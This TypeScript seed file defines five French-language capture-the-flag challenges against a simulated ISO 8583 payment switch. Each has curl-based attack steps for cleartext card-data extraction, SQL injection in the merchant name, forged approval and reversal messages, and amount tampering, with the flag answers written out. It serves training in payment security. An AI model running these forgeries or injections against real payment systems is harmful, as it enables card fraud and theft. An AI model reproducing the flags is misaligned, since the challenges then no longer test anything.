import type { CtfChallengeSeed } from '../ctfChallenges';

const s = (n: number, t: string, d: string, type: 'CURL_COMMAND' | 'ANALYSIS' | 'EXPLOITATION' | 'CODE_SNIPPET' | 'EXPLANATION' | 'OBSERVATION', cmd?: string, exp?: string, hint?: string): any => ({ stepNumber: n, stepTitle: t, stepDescription: d, stepType: type, ...(cmd && { commandTemplate: cmd }), ...(exp && { expectedOutput: exp }), ...(hint && { hintText: hint }) });
const h = (n: number, t: string, c: number): any => ({ hintNumber: n, hintText: t, costPoints: c });

export const NET_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: 'NET-001', title: 'Le Sniffer ISO', description: 'Pas de TLS entre le switch et l acquereur. Les messages ISO 8583 transitent en clair avec PAN, PIN block et montants.', freeModeDescription: 'Capturez le trafic entre les services et extrayez les donnees sensibles des messages ISO 8583 en clair.',
        category: 'NETWORK_ATTACK', difficulty: 'BEGINNER', points: 120, flagValue: 'PMP{ISO_CLEARTEXT_NO_TLS}',
        targetService: 'sim-network-switch', targetEndpoint: 'GET http://sim-network-switch:8004/transaction/recent-logs',
        vulnerabilityType: 'Cleartext protocol', attackVector: 'Network sniffing',
        learningObjectives: ['Detecter l absence de chiffrement en transit', 'Extraire des donnees sensibles du trafic reseau', 'Comprendre les exigences PCI DSS sur le chiffrement'],
        estimatedMinutes: 15, isActive: true, relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            s(1, 'Capture du trafic', 'Recuperez les logs du switch qui contiennent les messages ISO en clair.', 'CURL_COMMAND', 'curl -s http://sim-network-switch:8004/transaction/recent-logs | jq .[0:3]', 'Messages ISO avec PAN, montants et PIN blocks visibles'),
            s(2, 'Extraction de donnees sensibles', 'Filtrez les PAN et PIN blocks dans les logs.', 'CURL_COMMAND', 'curl -s http://sim-network-switch:8004/transaction/recent-logs | jq ".[].rawMessage" | grep -oE "4[0-9]{15}"', 'PAN complets en clair'),
            s(3, 'Impact PCI DSS', 'Exigence 4 : chiffrer les transmissions de donnees de porteur sur les reseaux ouverts. Ici, meme le reseau interne transmet en clair.', 'ANALYSIS'),
            s(4, 'Capture du flag', 'ISO 8583 en clair sans TLS.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Les logs du switch contiennent les messages ISO en clair. Consultez /transaction/recent-logs.', 5), h(2, 'Les PAN et PIN blocks sont visibles dans les logs — pas de chiffrement en transit.', 10), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'NET-002', title: 'L Injection ISO', description: 'Le champ DE 43 (merchant name) n est pas assaini. Une injection SQL via ce champ corrompte le parsing et peut extraire des donnees.', freeModeDescription: 'Injectez du SQL dans le champ merchant name d un message ISO 8583.',
        category: 'NETWORK_ATTACK', difficulty: 'INTERMEDIATE', points: 180, flagValue: 'PMP{ISO_SQLI_DE43}',
        prerequisiteChallengeCode: 'NET-001',
        targetService: 'sim-network-switch', targetEndpoint: 'POST http://sim-network-switch:8004/transaction/authorize',
        vulnerabilityType: 'SQL injection via ISO field', attackVector: 'ISO 8583 DE43 injection',
        learningObjectives: ['Identifier les points d injection dans ISO 8583', 'Exploiter une SQLi via un champ metier', 'Securiser le parsing des champs string ISO'],
        estimatedMinutes: 25, isActive: true, relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            s(1, 'Requete normale', 'Envoyez une transaction avec un merchant name normal.', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":50,\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\",\\"merchantName\\":\\"Boulangerie Martin\\"}" | jq .'),
            s(2, 'Injection dans merchantName', 'Inserez une payload SQL dans le merchant name.', 'CURL_COMMAND', "curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H \"Content-Type: application/json\" -d '{\"pan\":\"4111111111111111\",\"amount\":50,\"currency\":\"978\",\"merchantId\":\"SHOP001\",\"merchantName\":\"Boulangerie\\' OR 1=1--\"}' | jq .", 'Erreur SQL ou donnees supplementaires retournees'),
            s(3, 'Extraction de donnees', 'Avec UNION SELECT, extrayez des donnees de la base.', 'ANALYSIS', undefined, undefined, 'Essayez : UNION SELECT pan,amount FROM transactions--'),
            s(4, 'Capture du flag', 'SQLi via DE 43 ISO 8583.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Le champ merchantName n est pas assaini. Testez des guillemets simples.', 5), h(2, 'L injection fonctionne dans le merchantName. Utilisez OR 1=1-- pour confirmer.', 10), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'NET-003', title: 'Le MTI Forge', description: 'Le switch ne valide pas le MTI des messages recus. Un attaquant peut envoyer un 0110 (reponse) au lieu d un 0100 (requete) pour injecter une fausse approbation.', freeModeDescription: 'Forgez un message avec le MTI de reponse (0110) pour injecter une approbation sans transaction reelle.',
        category: 'NETWORK_ATTACK', difficulty: 'INTERMEDIATE', points: 200, flagValue: 'PMP{MTI_RESPONSE_INJECTION}',
        prerequisiteChallengeCode: 'NET-001',
        targetService: 'sim-network-switch', targetEndpoint: 'POST http://sim-network-switch:8004/transaction/raw-message',
        vulnerabilityType: 'Missing MTI validation', attackVector: 'Response injection',
        learningObjectives: ['Comprendre la structure MTI ISO 8583', 'Exploiter l absence de validation du type de message', 'Forger une fausse reponse d autorisation'],
        estimatedMinutes: 20, isActive: true, relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            s(1, 'Message normal 0100', 'Envoyez un message d autorisation standard (MTI 0100).', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/transaction/raw-message -H "Content-Type: application/json" -d "{\\"mti\\":\\"0100\\",\\"de2\\":\\"4111111111111111\\",\\"de4\\":\\"000000010000\\",\\"de49\\":\\"978\\"}" | jq .'),
            s(2, 'Injection de reponse 0110', 'Envoyez un 0110 (reponse) avec code approbation 00 force.', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/transaction/raw-message -H "Content-Type: application/json" -d "{\\"mti\\":\\"0110\\",\\"de2\\":\\"4111111111111111\\",\\"de4\\":\\"000000500000\\",\\"de39\\":\\"00\\",\\"de49\\":\\"978\\"}" | jq .', 'Le switch accepte la reponse forgee !'),
            s(3, 'Impact', 'Un attaquant sur le reseau peut injecter des fausses approbations (0110) pour des transactions qu il n a jamais initiees. Le merchant livre le bien sans que le paiement reel existe.', 'ANALYSIS'),
            s(4, 'Capture du flag', 'Injection de reponse MTI sans validation.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Le switch accepte les MTI de reponse (0110) comme s ils venaient de l issuer.', 5), h(2, 'Envoyez un 0110 avec de39=00 pour forger une approbation.', 10), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'NET-004', title: 'Le STAN Predictible', description: 'Le STAN (System Trace Audit Number) est sequentiel. Un attaquant peut predire le prochain STAN et forger un reversal pour annuler une transaction legitime.', freeModeDescription: 'Collectez des STANs de transactions consecutives, predisez le prochain et forgez un message de reversal.',
        category: 'NETWORK_ATTACK', difficulty: 'ADVANCED', points: 250, flagValue: 'PMP{STAN_SEQUENTIAL_REVERSAL}',
        prerequisiteChallengeCode: 'NET-002',
        targetService: 'sim-network-switch', targetEndpoint: 'POST http://sim-network-switch:8004/transaction/authorize',
        vulnerabilityType: 'Predictable STAN', attackVector: 'STAN prediction + reversal forgery',
        learningObjectives: ['Comprendre le role du STAN dans ISO 8583', 'Exploiter un STAN predictible pour forger des reversals', 'Proposer une randomisation du STAN'],
        estimatedMinutes: 30, isActive: true, relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            s(1, 'Collecte de STANs', 'Envoyez 10 transactions et notez les STANs.', 'CURL_COMMAND', 'for i in $(seq 1 10); do curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":$((i*10)),\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\"}" | jq -r .stan; done', 'STANs sequentiels'),
            s(2, 'Prediction du STAN', 'Calculez le prochain STAN en incrementant le dernier.', 'ANALYSIS', undefined, undefined, 'Le STAN s incremente de 1 a chaque transaction.'),
            s(3, 'Forge de reversal', 'Envoyez un reversal (0420) avec le STAN predit pour annuler la prochaine transaction.', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/transaction/raw-message -H "Content-Type: application/json" -d "{\\"mti\\":\\"0420\\",\\"de2\\":\\"4111111111111111\\",\\"de4\\":\\"000000050000\\",\\"de11\\":\\"000042\\",\\"de49\\":\\"978\\"}" | jq .', 'Reversal accepte !'),
            s(4, 'Impact', 'L attaquant annule des paiements legitimes = le merchant livre le bien mais l argent est reverse.', 'ANALYSIS'),
            s(5, 'Capture du flag', 'STAN sequentiel + reversal forge.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Les STANs s incrementent. Calculez le prochain.', 5), h(2, 'Forgez un reversal 0420 avec le STAN predit.', 15), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
    {
        code: 'NET-005', title: 'Le MAC Absent', description: 'Les messages ISO 8583 ne contiennent pas de DE 64/128 (MAC). Un attaquant peut modifier le montant d un message en transit sans detection.', freeModeDescription: 'Interceptez un message ISO et modifiez le montant. Il n y a pas de MAC pour detecter l alteration.',
        category: 'NETWORK_ATTACK', difficulty: 'INTERMEDIATE', points: 180, flagValue: 'PMP{ISO_NO_MAC_INTEGRITY}',
        prerequisiteChallengeCode: 'NET-001',
        targetService: 'sim-network-switch', targetEndpoint: 'POST http://sim-network-switch:8004/transaction/raw-message',
        vulnerabilityType: 'Missing message authentication code', attackVector: 'Message tampering',
        learningObjectives: ['Comprendre le role du MAC dans ISO 8583', 'Exploiter l absence de controle d integrite', 'Impact de la modification de montant en transit'],
        estimatedMinutes: 20, isActive: true, relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            s(1, 'Envoi sans MAC', 'Envoyez un message ISO et verifiez que DE 64/128 (MAC) n est pas present.', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/transaction/raw-message -H "Content-Type: application/json" -d "{\\"mti\\":\\"0100\\",\\"de2\\":\\"4111111111111111\\",\\"de4\\":\\"000000010000\\",\\"de49\\":\\"978\\"}" | jq .', 'Aucun champ MAC dans la reponse'),
            s(2, 'Modification du montant', 'Changez DE 4 (montant) de 100 a 99999 et renvoyez. Sans MAC, pas de detection de tampering.', 'CURL_COMMAND', 'curl -s -X POST http://sim-network-switch:8004/transaction/raw-message -H "Content-Type: application/json" -d "{\\"mti\\":\\"0100\\",\\"de2\\":\\"4111111111111111\\",\\"de4\\":\\"000009999900\\",\\"de49\\":\\"978\\"}" | jq .', 'Montant modifie accepte !'),
            s(3, 'Impact', 'N importe quel noeud intermediaire peut changer le montant en transit. Le porteur paie 100 EUR, le merchant recoit 99999 EUR.', 'ANALYSIS'),
            s(4, 'Capture du flag', 'Pas de MAC = pas d integrite ISO.', 'EXPLOITATION'),
        ],
        hints: [h(1, 'Les messages ISO sont envoyes sans DE 64 ni DE 128 (MAC).', 5), h(2, 'Modifiez DE 4 (montant) et renvoyez le message. Aucun controle d integrite.', 10), h(3, 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', 25)],
    },
];


